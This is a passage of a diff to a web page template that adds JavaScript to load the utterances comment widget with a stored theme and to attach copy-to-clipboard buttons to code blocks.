+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
